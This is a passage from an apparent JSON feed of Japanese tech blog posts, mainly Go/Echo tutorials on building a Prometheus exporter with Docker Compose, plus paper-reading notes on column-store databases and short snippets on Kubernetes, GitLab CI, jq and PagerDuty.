e.Use(middleware.Recover())    // Prometheus ミドルウェアを有効にします。    p := prometheus.NewPrometheus(\\"echo\\", nil)    p.Use(e)    // 3-shake.com への外部アクセスを計測するミドルウェアを追加します。    e.Use(measureExternalAccess)    // ルートのエンドポイントを設定します。    e.GET(\\"/\\", func(c echo.Context) error {        return c.String(http.StatusOK, \\"Hello, World!\\")    })    // /unstable エンドポイントを設定します。    // 20% の確率で HTTP ステータスコード 500 を返します。    e.GET(\\"/unstable\\", unstableEndpoint)    // サーバーを開始します。    e.Start(\\":2121\\")}varvarで3-shake.com への外部アクセスの情報を収集するための Prometheus メトリクスを定義していきます。var (    externalAccessDuration = prom.NewHistogram(        prom.HistogramOpts{            Name:    \\"external_access_duration_seconds\\",            Help:    \\"Duration of external access to 3-shake.com\\",            Buckets: prom.DefBuckets,        },    )    lastExternalAccessStatusCode = prom.NewGauge(        prom.GaugeOpts{            Name: \\"last_external_access_status_code\\",            Help: \\"Last status code of external access to 3-shake.com\\",        },    ))echo.labstack.cominitinit 関数でメトリクスを Prometheus に登録します。func init() {    prom.MustRegister(externalAccessDuration)    prom.MustRegister(lastExternalAccessStatusCode)}measureExternalAccessmeasureExternalAccess関数で3-shake.com への外部アクセスを計測するミドルウェアを定義します。こちらの方がEcho Likeな定義の仕方だと思うので好きです。Echo のカスタムミドルウェアで、リクエストが処理される前に 3-shake.com への外部アクセスを計測する役割を持っています。func measureExternalAccess(next echo.HandlerFunc) echo.HandlerFunc {    return func(c echo.Context) error {        // HTTP クライアントを作成し、タイムアウトを 10 秒に設定します。        client := &http.Client{Timeout: 10 * time.Second}        // 現在の時刻を取得し、アクセス開始時間として保持します。        startTime := time.Now()        // 3-shake.com に対して HTTP GET リクエストを送信します。        resp, err := client.Get(\\"https://3-shake.com\\")        // アクセス開始時間から現在の時刻までの経過時間を計算し、duration に格納します。        duration := time.Since(startTime)        // エラーが発生しない場合（リクエストが成功した場合）        if err == nil {            // アクセス時間（duration）をヒストグラムメトリクスに追加します。            externalAccessDuration.Observe(duration.Seconds())            // ステータスコードをゲージメトリクスに設定します。            lastExternalAccessStatusCode.Set(float64(resp.StatusCode))            // レスポンスのボディを閉じます。            resp.Body.Close()        }        // 次のミドルウェアまたはハンドラ関数に処理を移します。        return next(c)    }}unstableEndpointちゃんと、メトリクス値が取得できているか確認したいのでunstableEndpointというエンドポイントを追加し、リクエストのうち約 5 回に 1 回失敗するように実装しました。このエンドポイントは、リクエストが成功した場合には HTTP ステータスコード 200 を返し、失敗した場合には HTTP ステータスコード 500 を返します。func unstableEndpoint(c echo.Context) error {    // 0 から 4 までのランダムな整数を生成します。    randomNumber := rand.Intn(5)    // 生成された整数が 4 の場合、HTTP ステータスコード 500 を返します。    if randomNumber == 4 {        return c.String(http.StatusInternalServerError, \\"Something went wrong!\\")    }    // それ以外の場合、HTTP ステータスコード 200 を返します。    return c.String(http.StatusOK, \\"Success!\\")}curl してくるワンライナー(fish)も用意しましたので思う存分curl してください。for i in (seq 1 50); curl http://localhost:2121/unstable; echo \\"\\"; endMiddlewareを適用寂しいのでPrometheus 以外のMiddlewareをEchoインスタンスに適用しました。middleware.Logger() : リクエストのログを出力するMiddlewaremiddleware.Recover() : パニックを回復してアプリケーションがクラッシュしないようにするMiddleware   e.Use(middleware.Logger())    e.Use(middleware.Recover())Prometheus Middlewareを適用これだけなんです。Echo用の新しいPrometheus Middlewareインスタンスを作成します。作成したPrometheus MiddlewareインスタンスをEchoインスタンスに適用します。 // Prometheusミドルウェアを適用する    p := prometheus.NewPrometheus(\\"echo\\", nil)    p.Use(e)EchoのMiddlewareについてMiddlewareは、リクエストとレスポンスの処理の前後にカスタムロジックを実行するための仕組みを提供しています。EchoのMiddlewareは、コードの再利用性、可読性、そして機能の分離を向上させるために役立ちます。>Logger: Request    Logger->>Middleware1: Processed Request    Middleware1->>Recovery: Processed Request    Recovery->>Prometheus: Processed Request    Prometheus->>CORS: Processed Request    CORS->>Handler: Processed Request    Handler->>CORS: Response    CORS->>Prometheus: Processed Response    Prometheus->>Recovery: Processed Response    Recovery->>Middleware1: Processed Response    Middleware1->>Logger: Processed Response    Logger->>Client: Processed Responsemermaid.initialize({startOnLoad: true});echo.labstack.comEcho Echo Middleware の特徴Middlewareは、複数のMiddleware関数を組み合わせて実行することができます。これにより、機能を組み合わせてカスタム処理パイプラインを構築することができます。これらは登録された順序で実行されます。これにより、処理の流れを明確にし、簡単に制御できるようになります。また、Echoでは、これらをグローバルに適用することも、特定のルートに適用することもできます。これにより、アプリケーション全体または特定のエンドポイントに対してカスタム処理を適用できます。Echoは、いくつかの組み込みミドルウェアを提供していますが独自のカスタムミドルウェアを作成してアプリケーションに適用することもできます。e := echo.New()e.Use(middleware.Logger()) # 登録された順序で実行されるぞe.GET(\\"/\\",getHallo,middleware.Recover()) # e.GET(\\"/\\", <Handler>, <Middleware...>) で特定のルートにだけMiddlewareを登録できるe.Use(LoggingMiddleware) # 独自で実装するカスタムミドルウェアecho.labstack.com再び、Docker Compose での実行するんじゃろがい完全に同じことやってるのでこちらを参考にしてくださいsyu-m-5151.hatenablog.com見れたぞぉおおおおhttp://localhost:2121/metrics の結果もこちらに記載しておきますgithub.comGolang のEcho でMiddlewareを使ってアプリケーションのPrometheus Exporter を実装することができました。アラートの設定方法については他のブログを参照してください。さいごに以上で、Echo フレームワークを使って、Prometheus メトリクスを追加し、さらに不安定なエンドポイントを作成する方法を解説しました。この知識を活かして、みなさんのアプリケーションにメトリクスを取得する機能を追加して、可観測性を向上させましょう！全然、関係ないけど翻訳に携わってコンテナセキュリティのブラックボックス感が多少薄まるのでみんな読んでくれ...コンテナセキュリティ　コンテナ化されたアプリケーションを保護する要素技術作者:Liz RiceインプレスAmazon","link":"https://syu-m-5151.hatenablog.com/entry/2023/04/17/100001","isoDate":"2023-04-17T01:00:01.000Z","dateMiliSeconds":1681693201000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"Golang のEcho で Prometheus Exporter を実装する","contentSnippet":"はじめにPrometheus でアプリケーションの構築をしているとどうしてもこの値が取りたいのに... と思うことが多々ある。Pushgateway も選択肢として上げられるが今回は選択肢を増やしてほしいという意味でもExporterの実装方法について検討していきます。ExporterはPrometheusのpull モデルに適合し、監視対象のライフサイクルと一貫性があり、スケーラビリティと自動検出の利点を享受できるため、Pushgatewayよりも推奨される方法です。ただし、特定のユースケース（サービスレベルのバッチジョブなど）では、Pushgatewayの使用が適切な場合もあります。Pushgatewayを使う際には以下の問題点があるので注意が必要です。複数のインスタンスを1つのPushgatewayで監視すると、単一障害点とボトルネックが発生する可能性がある。Prometheusの自動インスタンスヘルスチェックが利用できなくなる。Pushgatewayは一度プッシュされたデータを忘れず、手動でAPIを通じて削除しない限り永久にPrometheusで公開されてしまう。Exporter の実装と運用はそこそこ手間になるので最適な方法を選んでほしいです。この辺はCloudを利用しても同じような問題があるので注意しながらやっていきましょう。はじめにExporterとはPrometheusの公式クライアントライブラリやっていくぞ！おら！環境構築実装についてコードを解説するんじゃいPrometheusのメトリクスを定義init関数registerMetrics関数updateMetrics関数prometheusMiddleware関数measureExternalAccess関数var 配下ってことぉおおおhttpRequestsTotalhttpRequestDurationhttpRequestSizehttpResponseSizehttpResponseTimeexternalAccessDurationDocker Compose での実行するんじゃろがいprometheus.ymldocker-compose.ymlDockerfiledocker compose の実行さいごにサンプルコードはこちらです。サンプルコード自体は雑多な作業リポジトリにおいてあるのでご注意ください。また、アプリケーション自体のリソースを確認するのにEcho のミドルウェアを使用していません。自身の利用しているライブラリーにPrometheus のエンドポイントを提供する機能がないか調べておきましょう。gRPCのGo Server にも同様の機能があります。あと、外部のリソースが確認したいだけならBlackbox exporterという選択肢もあります。github.comExporterとはExporterは、Prometheusがメトリクスを収集するために使用するプログラムです。Exporterは、アプリケーションやインフラストラクチャからメトリクスを収集し、Prometheusが理解できる形式に変換して提供します。公式ドキュメントで提供されているExporter一覧は、こちらを参照してください。Prometheusの公式クライアントライブラリPrometheusは、いくつかの言語用の公式クライアントライブラリを提供しており、これを使用してExporterを実装することができます。今回はGoで実装していくのこちらが参考になると思います。やっていくぞ！おら！やっていきます環境構築# Go のモジュールを作成する。必要なライブラリーはのちほど`go mod tidy` で持ってくる。go mod init prometheus-go-exporter実装について以下をmain.go に配置して実行(go run main.go)してください。以下のコードはEchoを利用したWebサーバーにPrometheusのExporterを実装し、3-shake.comへのアクセスを計測しています。http://localhost:2121/3-shake-status や http://localhost:2121/metrics で値を取得できていると思います。package mainimport (    \\"fmt\\"    \\"net/http\\"    \\"time\\"    \\"github.com/labstack/echo/v4\\"    \\"github.com/labstack/echo/v4/middleware\\"    \\"github.com/prometheus/client_golang/prometheus\\"    \\"github.com/prometheus/client_golang/prometheus/promhttp\\")// Prometheusのメトリクスを定義しています。// これらのメトリクスは、HTTPリクエストの情報や3-shake.comへのアクセス情報を収集するために使用されます。var (    httpRequestsTotal = prometheus.NewCounterVec(        prometheus.CounterOpts{            Name: \\"http_requests_total\\",            Help: \\"Number of HTTP requests processed\\",        },        []string{\\"method\\", \\"path\\"},    )    httpRequestDuration = prometheus.NewHistogramVec(        prometheus.HistogramOpts{            Name:    \\"http_request_duration_seconds\\",            Help:    \\"Duration of HTTP requests\\",            Buckets: prometheus.DefBuckets,        },        []string{\\"method\\", \\"path\\"},    )    httpRequestSize = prometheus.NewHistogramVec(        prometheus.HistogramOpts{            Name:    \\"http_request_size_bytes\\",            Help:    \\"Size of HTTP requests\\",            Buckets: prometheus.ExponentialBuckets(128, 2, 10),        },        []string{\\"method\\", \\"path\\"},    )    httpResponseSize = prometheus.NewHistogramVec(        prometheus.HistogramOpts{            Name:    \\"http_response_size_bytes\\",            Help:    \\"Size of HTTP responses\\",            Buckets: prometheus.ExponentialBuckets(128, 2, 10),        },        []string{\\"method\\", \\"path\\"},    )    httpResponseTime = prometheus.NewGaugeVec(        prometheus.GaugeOpts{            Name: \\"http_response_time_seconds\\",            Help: \\"Time of the last HTTP response\\",        },        []string{\\"method\\", \\"path\\"},    )    externalAccessDuration = prometheus.NewHistogram(        prometheus.HistogramOpts{            Name:    \\"external_access_duration_seconds\\",            Help:    \\"Duration of external access to 3-shake.com\\",            Buckets: prometheus.DefBuckets,        },    )    lastExternalAccessStatusCode = prometheus.NewGauge(        prometheus.GaugeOpts{            Name: \\"last_external_access_status_code\\",            Help: \\"Last status code of external access to 3-shake.com\\",        },    ))// init関数内で、メトリクスをPrometheusに登録しています。func init() {    registerMetrics()}// registerMetrics関数では、Prometheusにメトリクスを登録しています。// これにより、Prometheusがメトリクスを収集できるようになります。func registerMetrics() {    prometheus.MustRegister(httpRequestsTotal)    prometheus.MustRegister(httpRequestDuration)    prometheus.MustRegister(httpRequestSize)    prometheus.MustRegister(httpResponseSize)    prometheus.MustRegister(httpResponseTime)    prometheus.MustRegister(externalAccessDuration)    prometheus.MustRegister(lastExternalAccessStatusCode)}// updateMetrics関数では、受信したHTTPリクエストのメトリクスを更新しています。// これにより、各リクエストに関する情報が収集されます。func updateMetrics(method, path string, requestSize, responseSize int, duration time.Duration) {    httpRequestsTotal.WithLabelValues(method, path).Inc()    httpRequestDuration.WithLabelValues(method, path).Observe(duration.Seconds())    httpRequestSize.WithLabelValues(method, path).Observe(float64(requestSize))    httpResponseSize.WithLabelValues(method, path).Observe(float64(responseSize))    httpResponseTime.WithLabelValues(method, path).Set(float64(time.Now().Unix()))}// prometheusMiddleware関数では、Echoのミドルウェアとして、受信したHTTPリクエストに関するメトリクスを更新する機能を追加しています。func prometheusMiddleware(next echo.HandlerFunc) echo.HandlerFunc {    return func(c echo.Context) error {        startTime := time.Now()        err := next(c)        duration := time.Since(startTime)        requestSize := c.Request().ContentLength        responseSize := c.Response().Size        updateMetrics(c.Request().Method, c.Path(), int(requestSize), int(responseSize), duration)        return err    }}// measureExternalAccess関数では、3-shake.comへの外部アクセスを定期的に計測し、そのアクセス時間とステータスコードをメトリクスに格納しています。// この関数はメイン関数内で呼び出され、別のゴルーチンで実行されます。func measureExternalAccess() {    client := &http.Client{Timeout: 10 * time.Second}    go func() {        for {            startTime := time.Now()            resp, err := client.Get(\\"https://3-shake.com\\")            duration := time.Since(startTime)            if err == nil {                externalAccessDuration.Observe(duration.Seconds())                lastExternalAccessStatusCode.Set(float64(resp.StatusCode))                resp.Body.Close()            }            time.Sleep(1 * time.Minute)        }    }()}func main() {    // Echo instance    e := echo.New()    // Middleware for Prometheus Exporter    e.Use(prometheusMiddleware)    // Enable request logger    e.Use(middleware.Logger())    e.GET(\\"/3-shake-status\\", func(c echo.Context) error {        status := lastExternalAccessStatusCode.Desc().String()        return c.String(http.StatusOK, fmt.Sprintf(\\"Last 3-shake.com access status: %s\\", status))    })    // Prometheus Exporter endpoint    e.GET(\\"/metrics\\", echo.WrapHandler(promhttp.Handler()))    // Measure external access to 3-shake.com    measureExternalAccess()    // Start the server    e.Start(\\":2121\\")}コードを解説するんじゃい解説をします。Prometheusのメトリクスを定義Prometheusのメトリクスを定義しています。これらのメトリクスは、HTTPリクエストの情報や3-shake.comへのアクセス情報を収集するために使用されます。var (    // ... (省略)    externalAccessDuration = prometheus.NewHistogram(        prometheus.HistogramOpts{            Name:    \\"external_access_duration_seconds\\",            Help:    \\"Duration of external access to 3-shake.com\\",            Buckets: prometheus.DefBuckets,        },    )    lastExternalAccessStatusCode = prometheus.NewGauge(        prometheus.GaugeOpts{            Name: \\"last_external_access_status_code\\",            Help: \\"Last status code of external access to 3-shake.com\\",        },    ))init関数init関数内で、メトリクスをPrometheusに登録しています。func init() {    registerMetrics()}registerMetrics関数registerMetrics関数では、Prometheusにメトリクスを登録しています。これにより、Prometheusがメトリクスを収集できるようになります。func registerMetrics() {    // ... (省略)    prometheus.MustRegister(externalAccessDuration)    prometheus.MustRegister(lastExternalAccessStatusCode)}updateMetrics関数updateMetrics関数では、受信したHTTPリクエストのメトリクスを更新しています。これにより、各リクエストに関する情報が収集されます。func updateMetrics(method, path string, requestSize, responseSize int, duration time.Duration) {    // ... (省略)}prometheusMiddleware関数prometheusMiddleware関数では、Echoのミドルウェアとして、受信したHTTPリクエストに関するメトリクスを更新する機能を追加しています。func prometheusMiddleware(next echo.HandlerFunc) echo.HandlerFunc {    // ... (省略: )}measureExternalAccess関数measureExternalAccess関数 では、3-shake.comへの外部アクセスを定期的に計測し、そのアクセス時間とステータスコードをメトリクスに格納しています。この関数はメイン関数内で呼び出され、別のゴルーチンで実行されます。func measureExternalAccess() {    client := &http.Client{Timeout: 10 * time.Second}    go func() {        for {            startTime := time.Now()            resp, err := client.Get(\\"https://3-shake.com\\")            duration := time.Since(startTime)            if err == nil {                externalAccessDuration.Observe(duration.Seconds())                lastExternalAccessStatusCode.Set(float64(resp.StatusCode))                resp.Body.Close()            }            time.Sleep(1 * time.Minute)        }    }()}var 配下ってことぉおおおPrometheusのメトリクスを定義しています。この辺の実装はよく悩むと思うので公式の実装とかたくさん読むと何をどれに使えばよいかの勘所が掴めると思います。実際に使わないと差が分からないのでとっとと手を動かすのがオススメです。httpRequestsTotal処理されたHTTPリクエストの総数をカウントするメトリクスです。prometheus.NewCounterVec関数を使用して定義され、リクエストのメソッド（GET、POSTなど）とパス（リソースへのURLパス）によってラベル付けされます。httpRequestDurationHTTPリクエストの処理時間を記録するメトリクスです。prometheus.NewHistogramVec関数を使用して定義され、リクエストのメソッドとパスによってラベル付けされます。デフォルトのバケットは、prometheus.DefBucketsを使用して設定されます。httpRequestSizeHTTPリクエストのサイズ（バイト単位）を記録するメトリクスです。prometheus.NewHistogramVec関数を使用して定義され、リクエストのメソッドとパスによってラベル付けされます。バケットは、prometheus.ExponentialBuckets関数を使用して設定されます。httpResponseSizeHTTPレスポンスのサイズ（バイト単位）を記録するメトリクスです。prometheus.NewHistogramVec関数を使用して定義され、リクエストのメソッドとパスによってラベル付けされます。バケットは、同様にprometheus.ExponentialBuckets関数を使用して設定されます。httpResponseTimeHTTPレスポンスの時間を記録するメトリクスです。このメトリクスは、prometheus.NewGaugeVec関数を使用して定義され、リクエストのメソッドとパスによってラベル付けされます。externalAccessDurationこれは、3-shake.comへの外部アクセスの持続時間を記録するメトリクスです。このメトリクスは、prometheus.NewHistogram関数を使用して定義されます。デフォルトのバケットは、prometheus.DefBuckets関数を使用して設定されます。Docker Compose での実行するんじゃろがいprometheus.ymlまず、prometheus.ymlを作成します。このファイルには、Prometheusがどのようにメトリクスを収集するかについての設定が含まれています。global:  scrape_interval: 15sscrape_configs:  - job_name: \'echo_exporter\'    static_configs:      - targets: [\'echo_exporter:2121\']docker-compose.yml次に、docker-compose.ymlを作成します。このファイルには、PrometheusとGolangのEchoアプリケーションを実行するために必要なコンテナの設定が含まれています。version: \'3.8\'services:  echo_exporter:    build:       context: .      dockerfile: Dockerfile_exporter    ports:      - \\"2121:2121\\"  prometheus:    image: prom/prometheus:latest    volumes:      - ./prometheus.yml:/etc/prometheus/prometheus.yml    command:      - \\"--config.file=/etc/prometheus/prometheus.yml\\"    ports:      - \\"9090:9090\\"DockerfileDockerfileを作成して、Echoアプリケーションをコンテナで実行できるようにします。別に動けばよいのでなんか工夫とかはしてないです。本番でやるときはうまくマルチステージビルドとか使って下さい。# Use the official Golang image as the base imageFROM golang:1.20# Set the working directoryWORKDIR /app# Copy go.mod and go.sum to download dependenciesCOPY go.mod go.sum ./# Download dependenciesRUN go mod download# Copy the source codeCOPY . .# Build the applicationRUN go build -o main .# Expose the port the application will run onEXPOSE 2121# Run the applicationCMD [\\"./main\\"]docker compose の実行2023 年 6 月末から、Compose V1 はサポートされなくなり、すべての Docker Desktop バージョンから削除されるので注意してほしいです。ちなみにcompose がdockerコマンドに入るようになったのでdocker-compose 特別にインストールせずとも実行可能になりました。# デーモン化しちゃうdocker compose up -d Dockerfileを使用してecho_exporterサービスがビルドされ、PrometheusとGolangのEchoアプリケーションをそれぞれのコンテナで起動します。Prometheusは、echo_exporterサービスからメトリクスを収集し、ポート9090でアクセスできるようになります。last_external_access_status_code を確認するには起動した状態でこちらを参考にしてください。一回、シャットダウンしたので以下のようなグラフが出力されていますね。。長くなったのでこれで終わります。さいごに実は Echo において Prometheus は、HTTP リクエストのメトリックを生成することができるミドルウェアを提供しているので基本的な部分でコードを書く必要がありません。もし、アプリケーションに実装できるならそれが良いです。独自に実装などせずにエンドポイントにて500 Internal Server Errorが多発していればアラートをすれば良いだけなので...。もし、インフラのコードがアプリに組み込めないもしくはプロダクションコードは開発側しか触れない時には協力を仰いで下さい。開発側との人間関係に問題があったりセキュリティ上の課題がある場合には別の手段を考えましょう。package mainimport (    \\"github.com/labstack/echo/v4\\"    \\"github.com/labstack/echo-contrib/prometheus\\")func main() {    e := echo.New()    // Enable metrics middleware    p := prometheus.NewPrometheus(\\"echo\\", nil)    p.Use(e)    e.Logger.Fatal(e.Start(\\":1323\\"))}と書くだけで外部リソースへのアクセス以外のメトリクスは提供できます。また、外部リソースに対してもいくつかの構造体を持っているのでこれらも効率的に提供できます。echo.labstack.com本当に関係ないんですけど2023年4月19日にECサイト構築・運用セキュリティガイドラインを読み解く会 というのをやるので興味あれば！owasp-kyushu.connpass.com続編のブログも書いておきました。syu-m-5151.hatenablog.comPrometheus実践ガイド: クラウドネイティブな監視システムの構築作者:仲亀 拓馬テッキーメディアAmazon","link":"https://syu-m-5151.hatenablog.com/entry/2023/04/16/132450","isoDate":"2023-04-16T04:24:50.000Z","dateMiliSeconds":1681619090000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"列指向DBMSにおけるデータ圧縮手法の論文を読みました","contentSnippet":"この記事の趣旨\\"Integrating Compression and Execution in Column-Oriented Database Systems\\"という2006年に発表されたそれまで行指向DBMSで培われてきた圧縮方法による、検索高速化手法を列指向DBMSに適用・評価した論文を読んで行きます。Integrating Compression and Execution in Column-Oriented Database SystemsDaniel J. Abadi, Samuel R. Madden, Miguel C. Ferreira著者についてDaniel J. Abadi、Samuel R. Madden、Miguel C. Ferreiraのグループ。それぞれDBMSやデータ分析に関連する手法やパフォーマンスについて研究している。問題意識2006年ごろの研究ということもありC-storeデータベースの研究が少なかった時期の論文。既に検索パフォーマンスに寄与することがしられていたR-storeデータベースの圧縮手法を、C-storeへ応用や評価を行なった。手法提案手法は以下の圧縮技術の組み合わせからなる。Null圧縮辞書エンコーディングRun Lengthエンコーディングビットベクターエンコーディングエンコーディングで、それぞれのカテゴリに属するかどうかをバイナリで表現する圧縮方法Lempel-ZivエンコーディングGZIPでも使用されている圧縮方式。データの非重複ブロックを解析して既存のデータは対応するブロックへのポインタに、それ以外のみを新規に追加する。提案手法は圧縮方式が増えてもアクセスパターンをシンプルに留めるためにアクセス方法をAPIとして隠蔽した。そのため異なるエンコーディングも同一のAPIで保存でき、同一のAPIでも取得できる。当然ながら一つのエンコーディングで全てのデータに対応することは難しく、論文では使用すべき圧縮スキームの選び方を以下のようにまとめている。Figure10感想C-storeにおける古典的な圧縮手法がまとまった論文だった。近代DWHを利用する側では意識することが少ない部分だったためあたらしい知識も多かった。作業時間read26:5026:50author33:306:40summary58:2024:50","link":"https://nnaka2992.hatenablog.com/entry/cmu_reading_assignments/5_integrating_compresison_and_execution_in_cstore_dbms","isoDate":"2023-04-16T02:58:29.000Z","dateMiliSeconds":1681613909000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"Column Sketchesというindex手法の論文を読みました","contentSnippet":"この記事の趣旨前回と同様にCMU Advanced Databas Systems Spring2023のReading Assignmentとして出ている論文を読んで行きます。最近論文を読めてなかったのですが、この記事でモーベーションが上がったので再開しました。ころころやり方を変えるのはよろしくないものの、モチベーションのために先の記事のやり方でやります。今回はColumn Sketchという名前のIndex手法を提案した論文です。Lossy Compressionを採用した当手法がどのように、高速で堅牢な検索を実現しているのかについて述べています。Column Sketches: A Scan Accelerator for Rapid and Robust Predicate EvaluationBrian Hentschel, Michael S. Kester, Stratos Idreos著者についてBrain、Michael、Stratosのグループによる論文。いずれも機械学習とデータアクセスについて研究している。問題意識既存のindex手法ではそれぞれに得意/不得意があり多くのアクセスパターンに対応できる方法がなかった。またデータ分析で用いられるような列指向ストレージに対応しているものが少なかった。Column SketchはデータをLossy Compressionを使用してindexを作成する手法でこれらの問題を解決した。手法提案手法はデータを任意のbit長に変換し、bitで表わされたデータに対して初回の検索を行なうことで大幅に検索速度を向上させた。またこの手法は数値型のみではなく、varcharなどで表わされたカテゴリカルタイプを数値として扱うことで、データ分析に必要なデータタイプに対応している。提案手法は8bit数値型であれば以下のようなマッピングによって達成される。for x, y ∈ I8, S (x) ≠ S (y) ⇒ x ≠ yfor x, y ∈ I8, S (x) < S (y) ⇒ x < y以下の図は8bitデータに対してWHERE x < 90がどのようにindex作成され評価されるかの例である。Figure2: Column Sketchindex作成段階では数値をレンジベースで任意の個数のbitに圧縮する。そして評価時には90を含むデータより大きい値をすべて取得し、90を含むレンジに対しては個別に評価を行なう。感想読んでいる段階では数値型のみに対応したindexであれば、B-treeで十分ではないかと思ったものの読み進めていくと限定的ながらも文字型にも対応していて、分析用途では必要な機能が備わっているなと思った。全文テキスト検索のような用途には応用が難しそうで、銀の弾丸はないなと感じた。作業時間read27 min27 minauthor32 min5 minsummary58 min26 min論文以外への感想今回採用した論文の読み方をやってみた思ったのは事前に1時間で読んでまとめるぞと決めたことで随分集中して論文を読めました。あと今まで論文を原文で読まなきゃという個人的な使命感があったのですが、翻訳することで随分効率があがったので今後は翻訳してしまおうと思いました。Readableは文末のrea-dableのような表記や翻訳されない部分(おそらく数式を含む文章？)があるものの、フォーマットが維持されているため原文と照しあわせながら読めば非常に効率がよかったです。毎日論文読むなら正直買いです。毎日論文読みたいので課金しました。がんばるぞ!","link":"https://nnaka2992.hatenablog.com/entry/cmu_reading_assignments/4_column_sketch","isoDate":"2023-04-15T04:09:38.000Z","dateMiliSeconds":1681531778000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"Kubernetes の Probe の仕組みと考慮点","contentSnippet":"!Kubernetes 1.26 時点の話で、以降のマイナーバージョンで改善されている可能性があります。Kubernetes には、ワークロードの正常性を確認するための Probe という仕組みがあり、Liveness / Readiness / Startup Probe が用意されています。kubelet (Kubernetes のノード上で動作するエージェント) は、ワークロードに対して TCP Socket / HTTP GET / gRPC / Exec の中から指定されたチェックを定期的に実行します。それぞれの Probe の特性を理解して使い分けないとサービスに影響...","link":"https://zenn.dev/toversus/articles/5d1292160f5035","isoDate":"2023-04-10T02:20:29.000Z","dateMiliSeconds":1681093229000,"authorName":"Tsubasa Nagasawa","authorId":"toVersus"},{"title":"GitLab CI で artifacts:reports:dotenv を使って Job をまたいで変数を渡す","contentSnippet":"GitLab CI である Job で変数を定義して、それを後続の Job でも使いたいなと思って調べていたら artifacts:reports:dotenv にたどり着いたのでメモ。 以下、使用例 stages: - stage1 - stage2 - stage3 - stage4 job1: stage: stage1 script: - echo \\"MY_VAR1=first-variable\\" >> dot.env artifacts: expire_in: 30 mins","link":"https://blog.1q77.com/2023/04/gitlab-ci-artifacts-report-dotenv/","isoDate":"2023-04-04T16:27:22.000Z","dateMiliSeconds":1680625642000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"Orbstack を Docker Desktop の代わりに使う","contentSnippet":"きっかけ # brew update して新しく追加された formula を眺めるのが最近のちょっとした楽しみ — yteraoka (@yteraoka) January 12, 2023 で、 orbstack っていう formula が追加されてるのを見てほー、そんなものが、ということで試して","link":"https://blog.1q77.com/2023/04/orbstack/","isoDate":"2023-04-04T13:17:51.000Z","dateMiliSeconds":1680614271000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"[3-shakeインターンブログ] Datadog RUM について調査してみた","contentSnippet":"はじめに はじめまして、スリーシェイクの Sreake 事業部インターン生の大島康暉です。Sreake 事業部は SRE 関連技術に強みを持つエンジニアによるコンサルテーションサービスを提供する事業部であり、今回 SRE […]The post [3-shakeインターンブログ] Datadog RUM について調査してみた first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/datadog-rum/","isoDate":"2023-03-31T06:18:38.000Z","dateMiliSeconds":1680243518000,"authorName":"Sreake","authorId":"Sreake"},{"title":"kube-proxy の externalTrafficPolicy=Local の改善","contentSnippet":"tl;dr;Service type LoadBalancer の externalTrafficPolicy: Local は、Kubernetes 1.26 まで Pod のローリング更新時にトラフィックが喪失する問題があるので注意kubernetes-sigs/cloud-provider-kind は、ローカル環境でクラウドリソース (現在は LB のみ) が絡む処理をシミュレートできて便利GKE Dataplane v2 を利用している場合、GKE 1.26.1 時点で Cilium に externalTrafficPolicy: Local の改善が入ってい...","link":"https://zenn.dev/toversus/articles/6eeb3b708bdff3","isoDate":"2023-03-29T01:31:20.000Z","dateMiliSeconds":1680053480000,"authorName":"Tsubasa Nagasawa","authorId":"toVersus"},{"title":"PagerDuty で一定期間アラートを抑制する","contentSnippet":"PagerDuty でアラートを受け取っているプロジェクトで，以下のようにある時間帯はアラートを止めたいケースがあります。メンテナンスが予定されている。開発環境は営業時間内だけ動かすので，平日夜や土日祝日は止めたい。何も対策しないとアラートが鳴ってしまい，オンコール担当者を不用意に呼び出す結果になるので，そうならないようにきちんと設定します。 TL;DR各ケースで以下のように設定します。メンテナンス→メンテナンスウィンドウを設定平日夜・土日停止→曜日・時刻ベースのイベントルールを追加 方法1：メンテナンスウィンドウメンテナンスなどでダウンする時間帯があらかじ...","link":"https://zenn.dev/toshikish/articles/6958af565e6c65","isoDate":"2023-03-27T08:38:39.000Z","dateMiliSeconds":1679906319000,"authorName":"toshikish","authorId":"toshikish"},{"title":"jq commandの select でハマった話","contentSnippet":"結論配列のjsonに対してselectする際には、配列を一度オブジェクトの抽出をしないと複製されてしまう。なので、以下ではなくjq -r  \'select(.[].A | contains(\\"特定文字列\\")) | .[].B\' test.jsonこうしないといけないjq -r  \'.[] | select(.A | contains(\\"特定文字列\\")) | .B\' test.json 環境$ jq --version   jq-1.6 詰まった内容以下のjson(test.json)があったときにtest.json[    {        \\"hog...","link":"https://zenn.dev/satohjohn/articles/79faafa55e9a1e","isoDate":"2023-03-25T16:36:44.000Z","dateMiliSeconds":1679762204000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"ふと、思いだしたときに確認するって大事ですね、という話","contentSnippet":"本日、こんなお知らせが流れてきた。We updated our RSA SSH host key「そういえば、プライベートのPCでRSA使ってた…」と思い出したので、確認。$ ssh -T git@github.com@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!     @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@IT I...","link":"https://zenn.dev/nedoko_dok0dko/articles/174811e1685df2","isoDate":"2023-03-24T13:27:59.000Z","dateMiliSeconds":1679664479000,"authorName":"seno","authorId":"seno"},{"title":"Kubernetes と名前解決","contentSnippet":"tl;dr外部サービスのホスト名の末尾に . (ドット) を必ず指定しましょう。✅\xa0google.com.❌\xa0google.com末尾にドットを指定できない (e.g. SDK 組み込み) かつ大量の名前解決が発生している場合は、Pod の DNS Config の options で ndots: 1 を指定しましょう。Kubernetes の名前解決の仕組みを理解していないと、各ノードの conntrack テーブルが溢れてパケットが破棄され、サービスに影響が出ることがあります。 背景アプリケーションが外部のサービスを呼び出す場合、ホスト名を IP アド...","link":"https://zenn.dev/toversus/articles/d9faba80f68ea2","isoDate":"2023-03-22T07:36:38.000Z","dateMiliSeconds":1679470598000,"authorName":"Tsubasa Nagasawa","authorId":"toVersus"},{"title":"cloud 